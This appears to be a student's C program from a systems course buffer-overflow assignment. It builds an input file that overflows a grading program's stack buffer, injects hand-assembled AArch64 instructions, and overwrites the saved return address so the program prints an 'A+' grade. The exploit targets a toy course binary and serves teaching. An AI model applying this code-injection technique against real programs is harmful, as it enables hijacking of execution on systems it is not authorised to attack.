/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Ariel Yuan, Grace Best.                                    */
/* Purpose: "Produces a file called dataAplus with the student name,  */
/* a nullbyte, the grade A, a null byte, and the address of the.      */
/* malicious instruction in an array element of name[] to get an A+,  */
/* which will overwrite getName's stored x30 and padding to overrun   */
/* the stack.                                                         */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

/* This is supposed to be the comment before main? Returns 0.  */

FILE *psFILE;
int main(void)
{
    int i;
    
    unsigned int ulData;  /* Address of A instruction */
    unsigned long addr = 0x420060;  /* Address of A instruction */

    psFILE = fopen("dataAplus", "w");
    fprintf(psFILE, "Grace");   /* Write our names to file */
    fprintf(psFILE, "%c", '\0');     /* Write null byte after name */
    fprintf(psFILE, "A");     /* Add grade we (sort of) want */
    fprintf(psFILE, "%c", '\0');    /* Write null byte a */

    /* adr x0, name[6] */
    ulData = MiniAssembler_adr(0, 0x42005e, addr);
    /* Overwrite getName's stored x30 w/ instruction to get a A */
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /*bl 0x400690 <printf@plt>*/
    ulData = MiniAssembler_bl(0x400690, addr + 4);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* mov x1, '+' */
    ulData = MiniAssembler_mov(1, '+');
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* adr x0, string */
    ulData = MiniAssembler_adr(0, 0x400920, addr + 12);
    /* Overwrite getName's stored x30 w/ instruction to get a A */
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);
    
    /*bl 0x400690 <printf@plt>*/
    ulData = MiniAssembler_bl(0x400690, addr + 16);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* b 0x4008b0 */
    ulData = MiniAssembler_b(0x4008b0, addr + 20);
    fwrite(&ulData, sizeof(unsigned int), 1, psFILE);

    /* Write padding of 16 characters to overrun stack */
    for (i = 0; i < 16; i++)
    {
        fprintf(psFILE, "%c", '\0');
    }
    fwrite(&addr, sizeof(unsigned long), 1, psFILE);


    fclose(psFILE);
    return 0;
}